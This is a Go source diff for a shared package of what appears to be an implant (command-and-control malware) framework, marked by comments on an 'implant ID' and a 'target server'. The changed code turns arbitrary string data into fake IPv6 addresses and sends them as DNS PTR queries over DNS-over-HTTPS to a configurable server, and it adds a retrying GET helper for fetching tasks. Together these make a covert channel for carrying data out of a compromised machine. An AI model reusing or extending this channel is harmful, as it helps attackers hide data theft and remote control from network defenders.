@@ -1,3 +1,5 @@
+//go:build withDns
+
 package shared
 
 import (
@@ -7,62 +9,78 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	"strconv"
+	"net/url"
 	"strings"
+	"time"
 )
 
-// StringToIPv6List converts a string to a list of IPv6 addresses.
-func StringToIPv6List(input string) []string {
-	// Convert the input string to its hexadecimal representation
-	hexStr := hex.EncodeToString([]byte(input))
+// GetDataRequest makes a GET request to the given URL
+// It takes in 3 parameters
+// 1) The base URL to make the request to
+// 2) The maximum number of retries before giving up
+// 3) The query parameters to include in the request
+// It returns the response and any error that occurred
+func GetDataRequest(baseUrl string, maxRetries int, cookies ...*http.Cookie) (*http.Response, error) {
+	//fmt.Println("In GetDataRequest")
+	var resp *http.Response
+	var err error
 
-	// Pad the hex string to make its length a multiple of 32 characters (16 bytes)
-	if len(hexStr)%32 != 0 {
-		padding := 32 - len(hexStr)%32
-		hexStr += strings.Repeat("0", padding)
+	// Parse the base URL
+	reqURL, err := url.Parse(baseUrl)
+	//fmt.Printf("Parsing req URL %s\n", reqURL)
+	if err != nil {
+		//fmt.Println(err)
+		return nil, fmt.Errorf("invalid URL: %w", err)
 	}
 
-	// Split the hex string into 32-character chunks, each forming an IPv6 address
-	var ipv6Addresses []string
-	for i := 0; i < len(hexStr); i += 32 {
-		chunk := hexStr[i : i+32]
+	// Create an HTTP client
+	client := &http.Client{}
+	//fmt.Println("Created client")
 
-		// Format the chunk into an IPv6 address with 8 groups of 4 hex digits
-		ipv6 := fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s",
-			chunk[0:4], chunk[4:8], chunk[8:12], chunk[12:16],
-			chunk[16:20], chunk[20:24], chunk[24:28], chunk[28:32])
+	for attempts := 0; attempts < maxRetries; attempts++ {
+		// Create a new request for each attempt
+		//fmt.Println("Attempt #" + strconv.Itoa(attempts))
+		req, err := http.NewRequest("GET", reqURL.String(), nil)
+		//fmt.Printf("%v\n", req)
+		if err != nil {
+			//fmt.Println(err)
+			return nil, fmt.Errorf("failed to create request: %w", err)
+		}
 
-		ipv6Addresses = append(ipv6Addresses, ipv6)
+		// Add cookies to the request
+		for _, cookie := range cookies {
+			//fmt.Println(cookie)
+			req.AddCookie(cookie)
+		}
+
+		// Send the request
+		resp, err = client.Do(req)
+		//fmt.Printf("%v\n", resp)
+		if err == nil {
+
+			// Success, return the response
+			return resp, nil
+		}
+
+		// Log the error and retry after a delay
+		fmt.Printf("Error making GET request (attempt %d/%d): %v\n", attempts+1, maxRetries, err)
+		time.Sleep(10 * time.Second)
 	}
 
-	return ipv6Addresses
+	// Return the last error after exhausting retries
+	return nil, fmt.Errorf("failed to fetch URL after %d attempts: %w", maxRetries, err)
 }
 
-// Ipv6ToPTR converts an IPv6 address to its reverse DNS (PTR) format.
-func Ipv6ToPTR(ipv6 string) string {
-	// Remove colons and expand zeros to ensure 32 hexadecimal characters
-	ipv6 = strings.ReplaceAll(ipv6, ":", "")
-	if len(ipv6) < 32 {
-		ipv6 = fmt.Sprintf("%032s", ipv6)
-	}
-
-	// Reverse the hex characters and append ".ip6.arpa."
-	var reversedHex []string
-	for i := len(ipv6) - 1; i >= 0; i-- {
-		reversedHex = append(reversedHex, string(ipv6[i]))
-	}
-	return strings.Join(reversedHex, ".") + ".ip6.arpa"
-}
-
-// SendPTRRequest sends a PTR request to the target server
-// Takes in an IP and ID
+// SendDataRequest sends a PTR request to the target server
+// Takes in the URL, params to encode into a list, the max retries, and the cookies
 // The IP is the encoded data and the ID should be the implant ID hex encoded
-// SendPTRRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
-func SendPTRRequest(impId uint16, ipv6List []string) bool {
-
-	// ipFormData := StringToIPv6List("7465:7374::")
-	// ptrDomain := formatPTR(ipFormData)
-	ptrDomain := formatPTR(ipv6List)
+// The function input parameters matches the HTTP request package
+// SendDataRequest sends a DNS PTR request for a list of IPv6 addresses over HTTPS.
+func SendDataRequest(baseUrl string, params string, maxRetries int, cookies ...*http.Cookie) error {
+	// Convert the input to a list of IPv6 addresses
+	ipFormData := StringToIPv6List(params)
+	// Format it for PTR requests
+	ptrDomain := formatPTR(ipFormData)
 
 	// Build the DNS packet
 	var dnsPacket bytes.Buffer
@@ -77,8 +95,9 @@ func SendPTRRequest(impId uint16, ipv6List []string) bool {
 		NSCount uint16
 		ARCount uint16
 	}{
-		// ID:      0x04d2,    // 1234 in hex
-		ID:      impId,
+		// The transaction ID may be used for implant ID, but right now it's not
+		ID: 0x04d2, // 1234 in hex
+		// ID:      impId,
 		Flags:   0x0100,    // Standard recursive query
 		QDCount: ptrRCount, // 1 question
 	}
@@ -106,20 +125,24 @@ func SendPTRRequest(impId uint16, ipv6List []string) bool {
 
 	// Send the packet over HTTP
 	client := &http.Client{}
-	req, err := http.NewRequest("POST", "http://127.0.0.1:5000/", &dnsPacket)
+	req, err := http.NewRequest("POST", baseUrl, &dnsPacket)
 	if err != nil {
-		// fmt.Println("Error creating request:", err)
-		return false
+		//fmt.Println("Error creating request:", err)
+
+		return err
 	}
 	req.Header.Set("Content-Type", "application/dns-message")
-	impIdStr := strconv.Itoa(int(impId))
-	idCookie := &http.Cookie{Name: "id", Value: impIdStr}
-	req.AddCookie(idCookie)
+
+	// Add cookies to the request
+	for _, cookie := range cookies {
+		//fmt.Println(cookie)
+		req.AddCookie(cookie)
+	}
 
 	resp, err := client.Do(req)
 	if err != nil {
 		// fmt.Println("Error making DoH request:", err)
-		return false
+		return err
 	}
 	defer func(Body io.ReadCloser) {
 		err := Body.Close()
@@ -129,14 +152,14 @@ func SendPTRRequest(impId uint16, ipv6List []string) bool {
 	}(resp.Body)
 
 	// Read and display the response
-	_, err = io.ReadAll(resp.Body)
+	body, err := io.ReadAll(resp.Body)
 	if err != nil {
 		// fmt.Println("Error reading response:", err)
-		return false
+		return err
 	}
-	// fmt.Printf("Raw DoH Response: %x\n", body)
+	fmt.Printf("Raw DoH Response: %x\n", body)
 
-	return true
+	return nil
 }
 
 // Helper function to format PTR domains
@@ -161,6 +184,33 @@ func formatPTR(ipLs []string) []string {
 		domains = append(domains, domain)
 	}
 	return domains
+}
+
+// StringToIPv6List converts a string to a list of IPv6 addresses.
+func StringToIPv6List(input string) []string {
+	// Convert the input string to its hexadecimal representation
+	hexStr := hex.EncodeToString([]byte(input))
+
+	// Pad the hex string to make its length a multiple of 32 characters (16 bytes)
+	if len(hexStr)%32 != 0 {
+		padding := 32 - len(hexStr)%32
+		hexStr += strings.Repeat("0", padding)
+	}
+
+	// Split the hex string into 32-character chunks, each forming an IPv6 address
+	var ipv6Addresses []string
+	for i := 0; i < len(hexStr); i += 32 {
+		chunk := hexStr[i : i+32]
+
+		// Format the chunk into an IPv6 address with 8 groups of 4 hex digits
+		ipv6 := fmt.Sprintf("%s:%s:%s:%s:%s:%s:%s:%s",
+			chunk[0:4], chunk[4:8], chunk[8:12], chunk[12:16],
+			chunk[16:20], chunk[20:24], chunk[24:28], chunk[28:32])
+
+		ipv6Addresses = append(ipv6Addresses, ipv6)
+	}
+
+	return ipv6Addresses
 }
 
 func expandIPv6(ip string) string {
